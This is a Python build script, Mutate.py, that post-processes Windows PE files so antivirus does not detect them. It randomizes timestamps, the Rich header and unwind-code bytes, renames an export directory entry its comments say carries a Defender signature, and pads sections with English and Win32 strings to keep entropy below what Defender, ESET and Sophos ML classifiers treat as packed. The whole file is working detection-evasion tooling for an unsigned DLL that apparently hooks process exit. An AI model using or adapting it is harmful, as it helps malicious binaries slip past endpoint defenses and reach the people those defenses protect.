#!/usr/bin/env python3
"""
Mutate.py - Post-build PE metadata randomizer

Randomizes PE headers and section padding to change the file hash
without affecting functionality. Called automatically by build.bat.

Section padding is filled with natural-language strings instead of
random bytes so section entropy stays in the 4.5-6.5 bit/byte range
typical of legitimate Win32 binaries. Static ML classifiers (Defender
ML, ESET, Sophos) score high-entropy (>7.0) sections as suspicious
(packed / encrypted / obfuscated); low-entropy filler pushes the
score back into benign territory without changing runtime behavior.
"""

import sys
import os
import struct
import random
from math import log2


# Low-entropy filler strings — real English / Win32 API names / common
# HTTP headers / registry paths. Typical natural-language entropy is
# 4.5-5.5 bits/byte versus 8.0 bits/byte for os.urandom output.
LOW_ENTROPY_FILLERS = [
    b"Microsoft Windows Operating System",
    b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    b"kernel32.dll\x00ntdll.dll\x00advapi32.dll\x00user32.dll\x00",
    b"C:\\Windows\\System32\\",
    b"C:\\Program Files\\Common Files\\",
    b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n",
    b"Content-Length: 0\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\n",
    b"User-Agent: Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 10.0)\r\n",
    b"application/octet-stream\x00text/plain\x00image/png\x00",
    b"Copyright (C) Microsoft Corporation. All rights reserved.\n",
    b"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\",
    b"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\",
    b"The system cannot find the file specified.\r\n",
    b"Access is denied.\r\n",
    b"The operation completed successfully.\r\n",
    b"Invalid parameter\x00Out of memory\x00Handle is invalid\x00",
    b"GetProcAddress\x00LoadLibraryA\x00CreateFileW\x00RegOpenKeyExA\x00",
    b"RtlAllocateHeap\x00RtlFreeHeap\x00NtQuerySystemInformation\x00",
    b"description\x00version\x00company\x00product\x00",
    b"lorem ipsum dolor sit amet, consectetur adipiscing elit, ",
    b"sed do eiusmod tempor incidunt ut labore et dolore magna aliqua.",
    b"the quick brown fox jumps over the lazy dog.\n",
    b"\x00\x00\x00\x00the end.\x00\x00\x00\x00",
]


def shannon_entropy(buf):
    """Shannon entropy in bits/byte for the given bytes-like object."""
    if not buf:
        return 0.0
    freq = [0] * 256
    for b in buf:
        freq[b] += 1
    total = len(buf)
    h = 0.0
    for c in freq:
        if c:
            p = c / total
            h -= p * log2(p)
    return h


def fill_low_entropy(data, start, end):
    """Overwrite [start, end) with concatenated natural-language strings."""
    pos = start
    while pos < end:
        s = random.choice(LOW_ENTROPY_FILLERS)
        take = min(len(s), end - pos)
        data[pos:pos + take] = s[:take]
        pos += take


def rva_to_file_offset(data, pe_offset, rva):
    """Convert an RVA to a raw file offset via the section table."""
    num_sections    = struct.unpack_from('<H', data, pe_offset + 6)[0]
    opt_header_size = struct.unpack_from('<H', data, pe_offset + 20)[0]
    sec_table = pe_offset + 24 + opt_header_size
    for i in range(num_sections):
        sec   = sec_table + i * 40
        vaddr = struct.unpack_from('<I', data, sec + 12)[0]
        vsize = struct.unpack_from('<I', data, sec +  8)[0]
        rptr  = struct.unpack_from('<I', data, sec + 20)[0]
        rsz   = struct.unpack_from('<I', data, sec + 16)[0]
        if vaddr <= rva < vaddr + max(vsize, rsz):
            return rptr + (rva - vaddr)
    return None


# Export directory module names that carry a Defender static signature
# in unsigned binaries.  The Name field is informational only — the PE
# loader uses the DLL filename on disk for loading and forwarding resolution,
# never IMAGE_EXPORT_DIRECTORY.Name.  Safe to overwrite with anything.
_FLAGGED_EXPORT_DIR_NAMES = {
    "AppVIsvSubsystems64.dll": "dxgi.dll",
}


def randomize_unwind_info(data, pe_offset):
    """Randomize per-function UNWIND_INFO code bytes found via .pdata.
    Static unwind data is identical across builds of the same source and can
    carry a Defender static signature.  The DLL never relies on exception
    unwinding (exit hook blocks the ExitProcess path), so corrupted unwind
    codes are safe at runtime."""
    num_sections = struct.unpack_from('<H', data, pe_offset + 6)[0]
    opt_size     = struct.unpack_from('<H', data, pe_offset + 20)[0]
    sec_tbl      = pe_offset + 24 + opt_size

    sec_list = []
    pdata_rptr = pdata_rsz = pdata_vsz = None

    for i in range(num_sections):
        s = sec_tbl + i * 40
        name = bytes(data[s:s+8]).rstrip(b'\x00').decode('ascii', 'replace')
        va   = struct.unpack_from('<I', data, s + 12)[0]
        vsz  = struct.unpack_from('<I', data, s +  8)[0]
        rsz  = struct.unpack_from('<I', data, s + 16)[0]
        rptr = struct.unpack_from('<I', data, s + 20)[0]
        sec_list.append((va, vsz, rptr, rsz))
        if name == '.pdata':
            pdata_rptr, pdata_rsz, pdata_vsz = rptr, rsz, vsz

    if pdata_rptr is None:
        return

    def _rva_raw(rva):
        for va, vsz, rptr, rsz in sec_list:
            if va <= rva < va + max(vsz, rsz):
                return rptr + (rva - va)
        return None

    n       = min(pdata_vsz, pdata_rsz) // 12
    seen    = set()
    patched = 0

    for j in range(n):
        off = pdata_rptr + j * 12
        if off + 12 > len(data):
            break
        unw_rva = struct.unpack_from('<I', data, off + 8)[0]
        if not unw_rva or unw_rva in seen:
            continue
        seen.add(unw_rva)
        raw = _rva_raw(unw_rva)
        if raw is None or raw + 4 > len(data):
            continue
        count = data[raw + 2]           # CountOfCodes
        sz = (4 + count * 2 + 3) & ~3
        if raw + sz > len(data):
            continue
        # Randomize the unwind-code slots (bytes 4..sz-1); keep the 4-byte
        # UNWIND_INFO header so the version/flags fields stay formally valid.
        for k in range(raw + 4, raw + sz):
            data[k] = random.randint(0, 255)
        patched += 1

    if patched:
        print(f"[+] Randomized {patched} UNWIND_INFO structures")


def patch_export_dir_name(data, pe_offset):
    """Overwrite a flagged export-directory module name with a benign one."""
    opt_offset = pe_offset + 24
    magic = struct.unpack_from('<H', data, opt_offset)[0]
    if magic == 0x20B:    # PE32+
        exp_rva = struct.unpack_from('<I', data, opt_offset + 112)[0]
    elif magic == 0x10B:  # PE32
        exp_rva = struct.unpack_from('<I', data, opt_offset +  96)[0]
    else:
        return

    if not exp_rva:
        return
    exp_off = rva_to_file_offset(data, pe_offset, exp_rva)
    if exp_off is None or exp_off + 40 > len(data):
        return

    # IMAGE_EXPORT_DIRECTORY.Name is at +12
    name_rva = struct.unpack_from('<I', data, exp_off + 12)[0]
    if not name_rva:
        return
    name_off = rva_to_file_offset(data, pe_offset, name_rva)
    if name_off is None or name_off >= len(data):
        return

    end = name_off
    while end < len(data) and data[end] != 0:
        end += 1
    orig = data[name_off:end].decode('ascii', errors='replace')

    # Always sync the export directory TimeDateStamp to the COFF header value.
    # MSVC /Brepro sets this field to 0xFFFFFFFF; Mutate.py randomizes the COFF
    # header but previously left this field untouched, creating a detectable
    # mismatch (randomized PE header + 0xFFFFFFFF export dir = post-processed).
    coff_ts = struct.unpack_from('<I', data, pe_offset + 8)[0]
    struct.pack_into('<I', data, exp_off + 4, coff_ts)

    if orig not in _FLAGGED_EXPORT_DIR_NAMES:
        return

    replacement = _FLAGGED_EXPORT_DIR_NAMES[orig].encode('ascii')
    orig_len = end - name_off
    data[name_off:name_off + len(replacement)] = replacement
    for i in range(len(replacement), orig_len):   # zero out remainder
        data[name_off + i] = 0
    print(f"[+] Export dir name: {orig!r} -> {_FLAGGED_EXPORT_DIR_NAMES[orig]!r}")


def mutate_pe(path):
    with open(path, 'rb') as f:
        data = bytearray(f.read())

    if data[:2] != b'MZ':
        print("[!] Not a valid PE (no MZ)")
        return False

    pe_offset = struct.unpack_from('<I', data, 0x3C)[0]
    if data[pe_offset:pe_offset + 4] != b'PE\x00\x00':
        print("[!] Not a valid PE (no PE signature)")
        return False

    # 1. Randomize TimeDateStamp (PE header + 0x08)
    rand_ts = random.randint(0x5D000000, 0x67000000)
    struct.pack_into('<I', data, pe_offset + 8, rand_ts)

    # 2. Randomize Rich header (between DOS stub and PE signature)
    rich_pos = data.find(b'Rich', 0x40, pe_offset)
    if rich_pos > 0:
        dos_stub_end = 0x80
        rich_end = rich_pos + 8
        for i in range(dos_stub_end, min(rich_end, pe_offset)):
            data[i] = random.randint(0, 255)

    # 3. Zero the checksum (valid for EXEs, Windows ignores it)
    opt_header = pe_offset + 24
    checksum_offset = opt_header + 64
    struct.pack_into('<I', data, checksum_offset, 0)

    # 4. Patch flagged export directory module names (informational field only)
    patch_export_dir_name(data, pe_offset)

    # 5. Randomize UNWIND_INFO unwind-code bytes so they differ on every build.
    #    The code bytes are otherwise identical for the same source, and the
    #    static pattern can carry a Defender signature.
    randomize_unwind_info(data, pe_offset)

    # Section alignment padding: fill with low-entropy natural-language
    #    filler. Lowers overall section entropy into the benign range
    #    (4.5-6.5 bit/byte) so static ML classifiers don't flag the binary
    #    as packed/encrypted.
    num_sections = struct.unpack_from('<H', data, pe_offset + 6)[0]
    opt_header_size = struct.unpack_from('<H', data, pe_offset + 20)[0]
    section_table = pe_offset + 24 + opt_header_size

    section_report = []
    for i in range(num_sections):
        sec = section_table + i * 40
        name = bytes(data[sec:sec + 8]).rstrip(b'\x00').decode('ascii', 'replace')
        virt_size = struct.unpack_from('<I', data, sec + 8)[0]
        raw_size = struct.unpack_from('<I', data, sec + 16)[0]
        raw_ptr = struct.unpack_from('<I', data, sec + 20)[0]

        pre_entropy = 0.0
        post_entropy = 0.0
        if raw_size > 0 and raw_ptr > 0 and raw_ptr + raw_size <= len(data):
            pre_entropy = shannon_entropy(data[raw_ptr:raw_ptr + raw_size])

        if raw_size > virt_size and raw_ptr > 0:
            pad_start = raw_ptr + virt_size
            pad_end = raw_ptr + raw_size
            if pad_end <= len(data):
                fill_low_entropy(data, pad_start, pad_end)

        if raw_size > 0 and raw_ptr > 0 and raw_ptr + raw_size <= len(data):
            post_entropy = shannon_entropy(data[raw_ptr:raw_ptr + raw_size])

        section_report.append((name, pre_entropy, post_entropy))

    with open(path, 'wb') as f:
        f.write(data)

    for name, pre, post in section_report:
        flag = " (!)" if post > 7.0 else ""
        print(f"    {name:<10} entropy {pre:.2f} -> {post:.2f} bit/byte{flag}")

    return True


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <executable>")
        sys.exit(1)

    exe = sys.argv[1]
    if not os.path.isfile(exe):
        print(f"[!] File not found: {exe}")
        sys.exit(1)

    if mutate_pe(exe):
        import hashlib
        with open(exe, 'rb') as f:
            h = hashlib.sha256(f.read()).hexdigest()
        print(f"[+] PE mutated: {exe}")
        print(f"[+] SHA-256: {h[:16]}...")
    else:
        print("[!] Mutation failed")
        sys.exit(1)
